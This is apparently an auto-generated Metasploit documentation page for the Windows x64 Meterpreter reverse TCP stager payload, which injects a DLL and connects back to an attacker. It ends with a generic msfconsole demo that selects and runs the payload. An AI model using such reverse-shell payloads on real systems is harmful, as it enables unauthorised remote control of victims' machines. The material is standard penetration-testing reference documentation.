## Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager

Inject the meterpreter server DLL via the Reflective Dll 
Injection payload (staged x64). Connect back to the attacker 
(Windows x64)


## Module Name
payload/windows/x64/meterpreter/reverse_tcp

## Authors
* skape
* sf
* OJ Reeves


## References
* https://github.com/stephenfewer/ReflectiveDLLInjection
* https://github.com/rapid7/ReflectiveDLLInjection




## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/x64/meterpreter/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    